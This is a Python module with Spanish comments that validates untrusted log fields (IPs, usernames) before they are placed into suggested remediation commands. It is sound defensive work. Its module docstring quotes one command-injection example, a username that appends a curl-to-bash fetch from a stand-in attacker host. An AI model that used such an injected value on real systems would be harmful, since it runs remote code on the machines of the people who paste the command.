#!/usr/bin/env python3
"""Validadores de datos no confiables (hallazgo S-01).

**El principio que hace cumplir este módulo:**

> Ningún dato proveniente de un log llega a un comando sin pasar antes por un
> validador con lista blanca. Si no valida, la acción no se ofrece.

El sistema nunca ejecuta los comandos que sugiere — eso está certificado en
`tests/test_no_autonomy.py` y no cambia. Pero el dashboard se los presenta al
analista como "comando sugerido", con una explicación amable de qué hacen, para
que los copie y los pegue en una terminal con `sudo`. Si el `username` de un log
es `victima; curl http://atacante/x.sh | bash`, el sistema no ejecuta nada y aun
así el ataque funciona: lo ejecuta la persona.

La mitigación que ya existía ("los comandos salen del playbook, no del LLM")
cubre la **alucinación** del modelo. Esta cubre la **interpolación** de datos
hostiles en la plantilla del playbook. Son dos amenazas distintas.

Diseño: lista blanca, nunca lista negra. No se intenta detectar lo peligroso
(imposible de enumerar); se acepta únicamente lo que tiene la forma esperada.
"""

from __future__ import annotations

import ipaddress
import re

# Nombre de usuario POSIX. El primer carácter no puede ser `-` para que el valor
# nunca se interprete como una opción del comando (ej. `passwd -l`).
_USERNAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,31}$")

# Metacaracteres que le darían al valor un significado extra en una shell.
# Se usa solo para verificar (los validadores ya los excluyen por construcción),
# no para "limpiar" un valor: un valor que los contiene se rechaza, no se arregla.
_METACARACTERES_SHELL = frozenset(";|&$`<>()\n\r\t\\\"'*?[]{}!#~ ")

# Sentinela ya usado en el proyecto para una IP que no se pudo determinar.
IP_DESCONOCIDA = "desconocida"


def valid_ip(valor: object) -> str | None:
    """Devuelve la IP en forma canónica, o `None` si no es una IP válida.

    Se usa `ipaddress`, no un regex: acepta IPv4 e IPv6 reales y rechaza todo lo
    demás sin casos borde que analizar. Un regex de IPv4 escrito a mano deja
    pasar cosas como `1.2.3.4.5` o `01.02.03.04` según cómo esté redactado.
    """
    if not isinstance(valor, str) or not valor:
        return None
    try:
        return str(ipaddress.ip_address(valor.strip()))
    except ValueError:
        return None


def valid_username(valor: object) -> str | None:
    """Devuelve el nombre de usuario si respeta la forma POSIX, o `None`.

    `^[A-Za-z_][A-Za-z0-9_.-]{0,31}$` — no admite espacios ni ningún
    metacarácter de shell, así que el valor resultante no puede cambiar la
    estructura del comando en el que se incruste.
    """
    if not isinstance(valor, str):
        return None
    candidato = valor.strip()
    return candidato if _USERNAME_RE.match(candidato) else None


def safe_token(valor: object) -> bool:
    """¿Este valor puede incrustarse en un comando sin alterar su estructura?

    Verificación independiente de los validadores anteriores: si alguno fallara
    o se relajara, esta función lo detecta. La usan las pruebas y el propio
    playbook como última barrera antes de emitir un comando.
    """
    if not isinstance(valor, str) or not valor:
        return False
    return not (_METACARACTERES_SHELL & set(valor))


def resolver_ip_atacante(incidente_o_ips: object, respaldo: object = None) -> str | None:
    """Resuelve la IP del atacante en cascada: lista de IPs → respaldo → None.

    Cierra el hallazgo L-03: el incidente confirmado por el SIEM traía
    `attacker_ips` vacío y el playbook emitía el placeholder `<IP_ATACANTE>`
    aunque la IP real estuviera en `source_ip`. Devolver `None` es una respuesta
    legítima: significa "no hay IP que bloquear", y el playbook omite esa acción
    en vez de ofrecer un comando que no se puede ejecutar.
    """
    candidatos: list[object] = []
    if isinstance(incidente_o_ips, (list, tuple, set)):
        candidatos.extend(incidente_o_ips)
    elif incidente_o_ips is not None:
        candidatos.append(incidente_o_ips)
    if respaldo is not None:
        candidatos.append(respaldo)

    for candidato in candidatos:
        if candidato == IP_DESCONOCIDA:
            continue
        ip = valid_ip(candidato)
        if ip:
            return ip
    return None
